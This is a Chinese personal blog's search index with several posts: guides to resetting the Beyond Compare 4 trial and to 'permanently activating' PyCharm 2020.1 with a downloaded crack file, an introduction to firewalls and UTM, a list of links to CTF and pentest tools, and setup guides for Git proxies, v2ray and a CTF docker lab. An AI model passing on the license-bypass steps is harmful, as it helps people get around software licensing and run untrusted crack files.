<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Beyond Compare 4密钥解决办法</title>
    <url>/Beyond%20Compare%204%E5%AF%86%E9%92%A5%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
    <content><![CDATA[<p>Beyond Compare 4 密钥解决办法</p>
<span id="more"></span>

<article class="baidu_pl">
        <div id="article_content" class="article_content clearfix">
        <link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/ck_htmledit_views-b5506197d8.css">
                <div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p><strong>第一种办法（也是最有效的）</strong><br> <img src="https://img-blog.csdnimg.cn/20201020101129476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zODM0NTMwNg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br> 删除<strong>C:\Users\用户名\AppData\Roaming\Scooter Software\Beyond Compare 4</strong>下的所有文件，重启Beyond Compare 4即可（注意：用户名下的AppData文件夹有可能会被隐藏起来）</p> 
<p><strong>第二种办法</strong><br> 删除C:\Program Files\Beyond Compare 4\BCUnrar.dll（安装目录下的BCUnrar.dll文件），这个文件重命名或者直接删除。</p> 
<p><strong>第三种办法</strong><br> 修改注册表<br> 1、在搜索栏中输入 regedit ，打开注册表<br> 2、删除项目CacheId ：<br> HKEY_CURRENT_USER\Software\Scooter Software\Beyond Compare 4\CacheId</p>
                </div><div><div></div></div>
                <link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-d7a94ec6ab.css" rel="stylesheet">
                <link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-f1c5feb645.css" rel="stylesheet">
        </div>
    </article>

<p>————————————<br>本文转载自：<a href="https://blog.csdn.net/weixin_38345306/article/details/109175632?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&amp;dist_request_id=1331645.22594.16184845629740335&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">https://blog.csdn.net/weixin_38345306/article/details/109175632?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&amp;dist_request_id=1331645.22594.16184845629740335&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control</a></p>
]]></content>
      <categories>
        <category>工具</category>
        <category>软件</category>
      </categories>
      <tags>
        <tag>软件资源</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu中Pycharm专业版2020.1 安装，永久激活</title>
    <url>/Ubuntu%E4%B8%ADPycharm%E4%B8%93%E4%B8%9A%E7%89%882020.1%20%E5%AE%89%E8%A3%85%EF%BC%8C%E6%B0%B8%E4%B9%85%E6%BF%80%E6%B4%BB/</url>
    <content><![CDATA[<p>记录下 Ubuntu 中 Pycharm 专业版2020.1 安装激活</p>
<span id="more"></span>

<h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><ol>
<li><p>从官网下载 Pycharm Linux 专业版</p>
<p>官网链接：<a href="https://www.jetbrains.com/pycharm/download/#section=linux">https://www.jetbrains.com/pycharm/download/#section=linux</a></p>
<p>注意只适用于 2020.1 版本</p>
</li>
<li><p>解压pycharm-professional-2020.1.tar.gz</p>
</li>
<li><p>来到<code>pycharm解压的路径/pycharm-2020.1/bin</code>下，终端运行 pycharm，命令<code>./pycharm.sh</code><br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/softwares/pycharm_sh.jpg" alt="pycharm"></p>
</li>
<li><p>选择Evaluate for free，之后点击Evaluate<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/softwares/pycharm_evaluate.jpg" alt="pycharm"></p>
</li>
<li><p>在看到如下界面后开始进行永久激活Pycharm<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/softwares/pycharm_welcome.jpg" alt="pycharm"></p>
</li>
</ol>
<h2 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h2><ol>
<li><p>下载激活文件</p>
<blockquote>
<p><a href="https://pan.baidu.com/s/1_WvpBVTG7OGRoAvBRdlhnw">https://pan.baidu.com/s/1_WvpBVTG7OGRoAvBRdlhnw</a><br>提取码：x1k5</p>
</blockquote>
</li>
<li><p>将激活文件拖到 pycharm 主页面，然后点击 restart<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/softwares/pycharm_activation_restart.jpg" alt="pycharm"></p>
</li>
<li><p>重启后选择:为Pycharm安装<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/softwares/pycharm_activation_install.jpg" alt="pycharm"></p>
</li>
<li><p>点击 是，会自动重启Pycharm<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/softwares/pycharm_activation_agent_success.jpg" alt="pycharm"></p>
</li>
<li><p>启动Pycharm后 在菜单Help-&gt;About下看到如下信息证明安装并激活成功！<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/softwares/pycharm_about.jpg" alt="pycharm"></p>
</li>
</ol>
<p>本文转载自：<a href="https://www.cnblogs.com/fuhua/p/12799534.html#4565992">https://www.cnblogs.com/fuhua/p/12799534.html#4565992</a></p>
]]></content>
      <categories>
        <category>工具</category>
        <category>软件</category>
      </categories>
      <tags>
        <tag>软件资源</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全产品</title>
    <url>/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81/</url>
    <content><![CDATA[<p>信息安全产品介绍</p>
<span id="more"></span>

<h1 id="1-防火墙"><a href="#1-防火墙" class="headerlink" title="1. 防火墙"></a>1. 防火墙</h1><h2 id="1-1-防火墙简介"><a href="#1-1-防火墙简介" class="headerlink" title="1.1 防火墙简介"></a>1.1 防火墙简介</h2><p>  <strong>防火墙(Firewall)<strong>，也称防护墙，它是一个信息安全的防护系统，依照特定的规则，</strong>允许或禁止</strong>传输的数据通过，主要是<strong>网络层</strong>的安全防护设备。</p>
<p>  <strong>下一代防火墙(Next Generation Firewall, NG Firewall)<strong>，可以全面应对</strong>应用层</strong>威胁的<strong>高性能</strong>防火墙，提供网络层应用层一体化安全防护。</p>
<h2 id="1-2-防火墙的功能"><a href="#1-2-防火墙的功能" class="headerlink" title="1.2 防火墙的功能"></a>1.2 防火墙的功能</h2><p>  防火墙主要用于<strong>边界安全防护的访问控制和安全域的划分</strong>。</p>
<p>  防火墙的功能可以比作是小区门卫，允许“同意”的人进入小区，同时可以将“不同意”的人拒之门外。和小区门卫一样，可以通过各种办法，伪装身份进入小区。</p>
<p>  防火墙只限制进，不限制出。</p>
<p>  <img src="%E9%98%B2%E7%81%AB%E5%A2%99%E9%83%A8%E7%BD%B2.png" alt="防火墙部署"></p>
<ul>
<li>内网与外网间的边界安全防护</li>
<li>内网内各子网间边界安全防护（最小权限原则）</li>
</ul>
<p>  防火墙的部署模式<br>     1. 透明模式，也称为“网桥模式”、“透明桥接模式”，适用于原网络已部署好路由器和交换机，不改变原有网络，只需要防火墙进行安全防护。<br>     2. 路由模式，同时提供路由和 NAT 功能。<br>     3. 旁路（Tap）模式，不直接连在网络里，可以测试/使用防火墙的功能。</p>
<h2 id="1-3-防火墙的原理"><a href="#1-3-防火墙的原理" class="headerlink" title="1.3 防火墙的原理"></a>1.3 防火墙的原理</h2><p>   传统防火墙原理：将数据包拆包，查看四元组等下三层信息，来判断是否允许通过。<strong>（三层）</strong><br>   下一代防火墙：会对应用层，如垃圾邮件、病毒等，需要根据具体产品分析。<strong>（七层）</strong></p>
<h1 id="2-UTM"><a href="#2-UTM" class="headerlink" title="2. UTM"></a>2. UTM</h1><h2 id="2-1-UTM-简介"><a href="#2-1-UTM-简介" class="headerlink" title="2.1 UTM 简介"></a>2.1 UTM 简介</h2><p>  <strong>统一威胁管理（Unified Threat Management, UTM）</strong>，即将防病毒、入侵检测和防火墙安全设备划归统一威胁管理。</p>
<p>  在防火墙基础上发展起来，具备<strong>防火墙、IPS、防病毒、防垃圾邮件等综合功能</strong>。</p>
<p>  由于同时开启多项功能会降低 UTM 处理能力，因此主要适用于<strong>对性能要求不高的中低端领域</strong>。</p>
<p>  高端应用领域，比如电信、金融等行业，以专用高性能防火墙、IPS为主流。</p>
<h2 id="2-2-UTM-主要功能"><a href="#2-2-UTM-主要功能" class="headerlink" title="2.2 UTM 主要功能"></a>2.2 UTM 主要功能</h2><p>  UTM 集多种安全功能于一身，通过简单的一键式配置管理和持续的安全服务，构成一个标准的统一安全平台。</p>
<p>  集成了<strong>状态检测防火墙、VPN、网关防病毒、入侵防火（IPS）、绿色上网、反垃圾邮件</strong>等安全防护功能，还全面支持策略管理、IM/P2P管理、服务质量（QoS）、负载均衡、高可用性（HA）和带宽管理等功能。</p>
<p>  可以<strong>阻挡未授权的访问、网络入侵、病毒、蠕虫、木马、间谍软件、钓鱼诈骗、垃圾邮件</strong>，以及其它类型的安全威胁。</p>
<h2 id="2-3-UTM-部署"><a href="#2-3-UTM-部署" class="headerlink" title="2.3 UTM 部署"></a>2.3 UTM 部署</h2><p>  UTM 部署于网络边界。除了具有防火墙的功能还能够起 IDS、IPS、VPN、流量控制、身份认证和应用层防护。<br>  <img src="UTM%E9%83%A8%E7%BD%B2.png" alt="UTM部署"></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>产品</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>security tools</title>
    <url>/security%20tools/</url>
    <content><![CDATA[<p>收集学习网安过程中遇到的工具</p>
<span id="more"></span>

<ul>
<li><p>git 泄露：</p>
<ul>
<li>GitHack: <a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></li>
<li>scrabble: <a href="https://github.com/denny0223/scrabble">https://github.com/denny0223/scrabble</a></li>
</ul>
</li>
<li><p>网站目录扫描</p>
<ul>
<li>dirsearch：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></li>
</ul>
</li>
<li><p>Flask Session Cookie Decoder/Encoder（flask session 伪造）</p>
<ul>
<li>flask-session-cookie-manager： <a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></li>
</ul>
</li>
<li><p>Fastcgi PHP-FPM Client &amp;&amp; Code Execution</p>
<ul>
<li><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></li>
</ul>
</li>
<li><p>SSRF,自动组装 Gopher</p>
<ul>
<li>Gopherus: <a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>如何为 Git 设置代理</title>
    <url>/%E5%A6%82%E4%BD%95%E4%B8%BA%20Git%20%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h2 id="1-连接情况总览"><a href="#1-连接情况总览" class="headerlink" title="1. 连接情况总览"></a>1. 连接情况总览</h2><p>如果在克隆或从远程仓库获取数据时遇到很慢甚至超时的情况，那么此时可能需要配置 Git 的代理。这里讲讲两种情况的代理方法：使用 HTTP 或 HTTPS 协议连接到 Git 仓库的代理方法和使用 SSH 协议连接到 Git 仓库的代理方法。</p>
<span id="more"></span>
<ul>
<li><p>如果远程仓库的格式像下面那样，这种就是使用 HTTP 或 HTTPS 协议连接到 Git 仓库的情况</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;github.com&#x2F;cms-sw&#x2F;cmssw.git</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;cms-sw&#x2F;cmssw.git</span><br></pre></td></tr></table></figure></li>
<li><p>如果远程仓库的格式像下面那样，这种就是使用 SSH 协议连接到 Git 仓库的情况</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git@github.com:cms-sw&#x2F;cmssw.git</span><br><span class="line">ssh:&#x2F;&#x2F;git@github.com&#x2F;cms-sw&#x2F;cmssw.git</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="2-使用-HTTP-或-HTTPS-协议连接到-Git-仓库的代理方法"><a href="#2-使用-HTTP-或-HTTPS-协议连接到-Git-仓库的代理方法" class="headerlink" title="2. 使用 HTTP 或 HTTPS 协议连接到 Git 仓库的代理方法"></a>2. 使用 HTTP 或 HTTPS 协议连接到 Git 仓库的代理方法</h2><h3 id="2-1-针对所有域名的-Git-仓库"><a href="#2-1-针对所有域名的-Git-仓库" class="headerlink" title="2.1 针对所有域名的 Git 仓库"></a>2.1 针对所有域名的 Git 仓库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># HTTP&#x2F;HTTPS 协议，port 需与代理软件设置的一致</span><br><span class="line">git config –-global http.proxy http:&#x2F;&#x2F;127.0.0.1:port</span><br><span class="line">git config –-global http.proxy http:&#x2F;&#x2F;127.0.0.1:8889</span><br><span class="line"></span><br><span class="line"># SOCKS5 协议</span><br><span class="line">git config --global http.proxy socks5:&#x2F;&#x2F;127.0.0.1:port</span><br><span class="line">git config --global http.proxy socks5:&#x2F;&#x2F;127.0.0.1:1089</span><br></pre></td></tr></table></figure>
<p>注意：</p>
<ul>
<li><code>--glboal</code> 选项指的是修改 Git 的全局配置文件<code>~/.gitconfig</code>，而非各个 Git 仓库里的配置文件<code>.git/config</code>。</li>
<li><code>port</code>则为端口号。</li>
</ul>
<h3 id="2-2-针对特定域名的-Git-仓库"><a href="#2-2-针对特定域名的-Git-仓库" class="headerlink" title="2.2 针对特定域名的 Git 仓库"></a>2.2 针对特定域名的 Git 仓库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># HTTP&#x2F;HTTPS 协议</span><br><span class="line">git config –global http.url.proxy http:&#x2F;&#x2F;127.0.0.1:port</span><br><span class="line"># 以 Github 为例</span><br><span class="line">git config –global http.https:&#x2F;&#x2F;github.com.proxy http:&#x2F;&#x2F;127.0.0.1:port</span><br><span class="line"></span><br><span class="line"># SOCKS5 协议</span><br><span class="line">git config –global http.url.proxy socks5:&#x2F;&#x2F;127.0.0.1:port</span><br><span class="line"># 以 Github 为例</span><br><span class="line">git config –global http.https:&#x2F;&#x2F;github.com.proxy socks5:&#x2F;&#x2F;127.0.0.1:port</span><br></pre></td></tr></table></figure>
<p>注意：</p>
<ul>
<li><code>url</code> 即为需要走代理的仓库域名，url 以 http:// 和 https:// 打头的均用这个方法。</li>
<li>网上很多中文教程，可能会告诉你<code>https://</code>打头的 url 使用“git config –global https.<a href="https://example.com.proxy/">https://example.com.proxy</a> protocol://127.0.0.1:port”，这种做法其实是错的！记住一点：Git 不认<code>https.proxy</code>，设置<code>http.proxy</code>就可以支持 https 了。</li>
<li>如果想了解 url 的更多模式，如子域名等的情况，可参照 Git 的官方文档 。网页内容搜索 http.<url>.*，即可找到相关信息。</li>
</ul>
<h2 id="3-使用-SSH-协议连接到-Git-仓库的代理方法"><a href="#3-使用-SSH-协议连接到-Git-仓库的代理方法" class="headerlink" title="3. 使用 SSH 协议连接到 Git 仓库的代理方法"></a>3. 使用 SSH 协议连接到 Git 仓库的代理方法</h2><p>Git 依靠 ssh 处理连接时，为了通过代理进行连接，必须配置 ssh 本身，在 ~/.ssh/config 文件中设置 ProxyCommand 选项。Linux 和 macOS 是通过 nc 来执行 ProxyCommand 的，Windows 下则是通过 connect。</p>
<h3 id="3-1-Linux-和-macOS-用户"><a href="#3-1-Linux-和-macOS-用户" class="headerlink" title="3.1 Linux 和 macOS 用户"></a>3.1 Linux 和 macOS 用户</h3><p>编辑 <code>~/.ssh/config</code> 文件,给文件加上如下对应内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># HTTP 代理</span><br><span class="line">Host github.com</span><br><span class="line">    User git</span><br><span class="line">    ProxyCommand nc -X connect -x 127.0.0.1:7890 %h %p</span><br></pre></td></tr></table></figure>
<p>解释:</p>
<ul>
<li>Host 后面 接的 <code>github.com</code> 是指定要走代理的仓库域名。</li>
<li>在 ProxyCommand 中，Linux 和 macOS 用户用的是 nc。</li>
<li>-X 选项后面接的是 connect 的意思是 HTTPS 代理。</li>
<li>-x 选项后面加上代理地址和端口号。</li>
<li>在调用 ProxyCommand 时，％h 和 ％p 将会被自动替换为目标主机名和 SSH 命令指定的端口（%h 和 %p 不要修改，保留原样即可）。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># SOCKS5 协议</span><br><span class="line"># 两种方式任选一个</span><br><span class="line"></span><br><span class="line"># 第一种</span><br><span class="line">Host github.com</span><br><span class="line">    User git</span><br><span class="line">    ProxyCommand nc -X 5 -x 127.0.0.1:7891 %h %p</span><br><span class="line">    </span><br><span class="line"># 第二种</span><br><span class="line">Host github.com</span><br><span class="line">    User git</span><br><span class="line">    ProxyCommand nc -x 127.0.0.1:7891 %h %p</span><br></pre></td></tr></table></figure>
<p>解释:</p>
<ul>
<li>Host 后面 接的 github.com 是指定要走代理的仓库域名。</li>
<li>在 ProxyCommand 中，Linux 和 macOS 用户用的是 nc 。</li>
<li>在调用 ProxyCommand 时，％h 和 ％p 将会被自动替换为目标主机名和 SSH 命令指定的端口（ %h 和 %p 不要修改，保留原样即可）。</li>
<li>如果 -X 选项后面接的是数字 5，那么指的就是 socks5 代理。</li>
<li>当然不写上 -X 选项也是可以的，因为在没有指定协议的情况下，默认是使用socks5代理的。所以2 种的写法效果一样 ，都指的是走 socks5 代理</li>
</ul>
<h3 id="3-2-Windows-用户"><a href="#3-2-Windows-用户" class="headerlink" title="3.2 Windows 用户"></a>3.2 Windows 用户</h3><p>编辑 <code>~/.ssh/config</code> 文件,给文件加上如下对应内容.windows 的 ~ 路径一般是<code>C:\Users\用户名</code>,可在 git bash 中 输入 <code>cd ~</code>进入 ~目录,再用<code>pwd</code>命令显示当前路径.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># HTTP代理</span><br><span class="line">Host github.com</span><br><span class="line">    User git</span><br><span class="line">    ProxyCommand connect -H 127.0.0.1:7890 %h %p</span><br><span class="line">    </span><br><span class="line"># SOCKS5代理</span><br><span class="line">Host github.com</span><br><span class="line">    User git</span><br><span class="line">    ProxyCommand connect -S 127.0.0.1:7891 %h %p</span><br></pre></td></tr></table></figure>
<p>解释:</p>
<ul>
<li>Host 后面 接的 github.com 是指定要走代理的仓库域名。</li>
<li>在 ProxyCommand 中，Windows 用户用的是 connect。</li>
<li>-H 选项的意思是 HTTP 代理</li>
<li>-S 选项指的就是 socks5 代理</li>
<li>在调用 ProxyCommand 时，％h 和 ％p 将会被自动替换为目标主机名和 SSH 命令指定的端口（ %h 和 %p 不要修改，保留原样即可）。</li>
</ul>
<h2 id="4-署名"><a href="#4-署名" class="headerlink" title="4. 署名"></a>4. 署名</h2><p>本文内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议<br>参考文章永久链接是：<a href="https://ericclose.github.io/git-proxy-config.html">https://ericclose.github.io/git-proxy-config.html</a><br>本文根据参考文章仅做了少量修改</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>proxy</category>
      </categories>
      <tags>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>如何配置 v2ray 详细教程</title>
    <url>/%E5%A6%82%E4%BD%95%E9%85%8D%E7%BD%AE%20v2ray%20%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>V2ray 是继 Shadowsocks(R) 后又一个体验很棒、功能非常强大的科学上网工具，近年来受到网友的广泛关注和喜爱。本教程详细介绍V2ray的安装和配置过程，让读者能迅速上手和使用V2ray。</p>
<span id="more"></span>

<h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><blockquote>
<p>先创建安装 v2ray 的目录</p>
</blockquote>
<ol>
<li>下载 QT 实现的 v2ray 界面。在官网链接上找到最新的 release 下载。<blockquote>
<p><a href="https://github.com/Qv2ray/Qv2ray/releases">https://github.com/Qv2ray/Qv2ray/releases</a> 。</p>
</blockquote>
</li>
</ol>
<p>比如，我目前下载的是Qv2ray.v2.2.3.linux-x64.AppImage。</p>
<blockquote>
<p><a href="https://github.com/Qv2ray/Qv2ray/releases">https://github.com/Qv2ray/Qv2ray/releases</a></p>
</blockquote>
<ol start="2">
<li><p>下载v2ray核心</p>
<blockquote>
<p><a href="https://github.com/v2ray/v2ray-core/releases">https://github.com/v2ray/v2ray-core/releases</a></p>
</blockquote>
</li>
<li><p>解压v2ray核心文件</p>
</li>
<li><p>执行 Qv2ray 客户端，选择首选项 -&gt; 内核设置，修改下列两个路径</p>
<ul>
<li>V2Ray 核心文件可执行<strong>文件</strong>路径：<code>.../v2ray-windows-64/wv2ray.exe</code></li>
<li>V2Ray 资源<strong>目录</strong>：<code>.../v2ray-windows-64/</code></li>
</ul>
</li>
<li><p>点击检查 V2Ray 核心设置，通过即可.<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/softwares/v2ray_settings.png" alt="v2ray"></p>
</li>
<li><p>返回 Qv2ray 主界面，选择：分组 -&gt; 订阅设置，勾选此分组是一个订阅，再填写上自己的 v2ray 订阅地址，点击更新订阅 -&gt; 确定（ok）</p>
</li>
<li><p>配置成功 Qv2ray 主界面默认分组内会出现多条线路，并显示链路的个数。</p>
</li>
</ol>
<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><blockquote>
<p>可自建 v2ray 目录，也可直接将 v2ray core 放在 ~/.config/qv2ray/vcore/ 中，这是 Qvray 默认路径。</p>
</blockquote>
<ol>
<li>下载QT实现的v2ray界面。在官网链接上找到最新的release下载。<blockquote>
<p><a href="https://github.com/Qv2ray/Qv2ray/releases">https://github.com/Qv2ray/Qv2ray/releases</a> 。</p>
</blockquote>
</li>
</ol>
<p>比如，我目前下载的是Qv2ray.v2.6.3.linux-x64.AppImage。</p>
<ol start="2">
<li>下载v2ray core核心文件。打开官方网站：<blockquote>
<p><a href="https://github.com/v2ray/v2ray-core/releases/">https://github.com/v2ray/v2ray-core/releases/</a> 。</p>
</blockquote>
</li>
</ol>
<p>选择下载文件v2ray-linux-64.zip。</p>
<ol start="3">
<li><p>进入 v2ray 下载的目录（我的是<code>~/v2ray</code>），执行下面命令给 Qv2ray 增加权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chmod +x ./Qv2ray.v2.6.3.linux-x64.AppImage  # 注意版本号</span><br></pre></td></tr></table></figure></li>
<li><p>启动 Qv2ray。仍然在v2ray根目录，执行下列终端命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./Qv2ray.v2.6.3.linux-x64.AppImage</span><br></pre></td></tr></table></figure></li>
<li><p>解压 v2ray core 核心文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unzip v2ray-linux-64.zip</span><br></pre></td></tr></table></figure></li>
</ol>
<p>注意不要用 <code>sudo</code> 解压，用 <code>sudo</code> 解压须给 <code>v2ray-linux-64</code> 加权限，容易造成权限紊乱。</p>
<ol start="5">
<li>在 Qv2ray 的首选项(Preference) 页面的内核设置（General Setting）中，设置v2ray核心文件的路径。</li>
</ol>
<p>默认的路径是<code>~/.config/qv2ray/vcore/</code>。如果没有新建 v2ray 目录结构，可以将 v2ray-linux-64.zip 解压后的文件都放置到这个目录里面。</p>
<p>如果自建 v2ray 目录，选择自己的 V2Ray 核心可执行文件路径和 V2Ray 资源目录。</p>
<p>最后，可以点击Check V2ray Core Setting按钮，验证这两个可执行文件的有效性。<br>   <img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/softwares/v2ray_linux_settings.png" alt="v2ray"></p>
<ol start="6">
<li>返回 Qv2ray 主界面，选择：分组 -&gt; 订阅设置，勾选此分组是一个订阅，再填写上自己的 v2ray 订阅地址，点击更新订阅 -&gt; 确定（ok）<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 不可用</span><br><span class="line">https:&#x2F;&#x2F;cloudfront-cdn-hk-iplc1.com&#x2F;sub&#x2F;v&#x2F;wrvDgcKnw6nDncOAwrrCmMOOw5_CiH1-wqPCnMK1w4LCosOcw4B8wq1_w98k&#x3D;&#x2F;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>在 Qv2ray 的首选项（Preferences）窗口中，可以设置语言、系统代理、开机启动等。</p>
</li>
<li><p>如果想仅仅在 Chrome 浏览器上做网络翻墙功能，就在 Chrome 浏览器上安装 Proxy SwitchyOmega 插件。在插件的配置页面上，设置Proxy Server，采用协议SOCK5，代理服务器是本地127.0.0.1，端口是1088（具体端口号查看 Qv2ray的 首选项（Preferences）。</p>
</li>
<li><p>如果不想做全局的系统代理 System Proxy，在Qv2ray的首选项中取消系统代理即可。</p>
</li>
<li><p>Git 的代理需要另外配置。</p>
</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li>【Linux配置v2ray详细教程-Ubuntu为例】：<a href="https://www.boluo.in/1776.html">https://www.boluo.in/1776.htm</a>l</li>
</ul>
]]></content>
      <categories>
        <category>工具</category>
        <category>proxy</category>
      </categories>
      <tags>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>如何搭建《从0到1：CTFer 成长之路》docker 做题环境</title>
    <url>/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%20%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8Bdocker%20%E5%81%9A%E9%A2%98%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<p>《从0到1：CTFer 成长之路》书中涉及的题目已经封装成 docker 镜像，通过 docker 很容易能在本地实现做题的环境。</p>
<span id="more"></span>

<h2 id="1-安装-docker"><a href="#1-安装-docker" class="headerlink" title="1. 安装 docker"></a>1. 安装 docker</h2><ul>
<li>使用官方安装脚本安装<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo curl -fsSL https:&#x2F;&#x2F;get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure></li>
<li>也可以使用国内 daocloud 一键安装命令：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo curl -sSL https:&#x2F;&#x2F;get.daocloud.io&#x2F;docker | sh</span><br></pre></td></tr></table></figure>
详细文档：<a href="https://www.runoob.com/docker/ubuntu-docker-install.html">https://www.runoob.com/docker/ubuntu-docker-install.html</a><blockquote>
<p>由于之前使用了 snap 安装过 docker，运行 docker 命令出现：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bash:/snap/bin/docker: No such file or directory<br>而实际上使用官方安装脚本安装后的 docker 应该链接至：/usr/bin/docker<br>因此将 /snap/bin/docker 链接至 /usr/bin/docker 即可</p>
</blockquote>
</li>
<li>查看 docker 镜像<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo docker images</span><br></pre></td></tr></table></figure></li>
<li>重启 docker 服务<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="2-docker-换源"><a href="#2-docker-换源" class="headerlink" title="2. docker 换源"></a>2. docker 换源</h2><ul>
<li>docker换源的配置文件默认在<code>/etc/docker/daemon.json</code>，若无 <code>daemon.json</code>，直接创建即可<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;etc&#x2F;docker</span><br><span class="line"># 若该目录下无 daemon.json，直接创建</span><br><span class="line">sudo touch daemon.json</span><br><span class="line"></span><br><span class="line">sudo vim daemon.json</span><br><span class="line"># 将下面内容输入到 daemon.json 中</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot; : [</span><br><span class="line">    &quot;http:&#x2F;&#x2F;ovfftd6p.mirror.aliyuncs.com&quot;,</span><br><span class="line">    &quot;http:&#x2F;&#x2F;registry.docker-cn.com&quot;,</span><br><span class="line">    &quot;http:&#x2F;&#x2F;docker.mirrors.ustc.edu.cn&quot;,</span><br><span class="line">    &quot;http:&#x2F;&#x2F;hub-mirror.c.163.com&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;insecure-registries&quot; : [</span><br><span class="line">    &quot;registry.docker-cn.com&quot;,</span><br><span class="line">    &quot;docker.mirrors.ustc.edu.cn&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;debug&quot; : true,</span><br><span class="line">  &quot;experimental&quot; : true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>保存并重启 docker 服务<br>确定是否换源成功，如果如下命令能看到 daemon.json 里的网址表示换源成功<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo docker info</span><br></pre></td></tr></table></figure></li>
</ul>
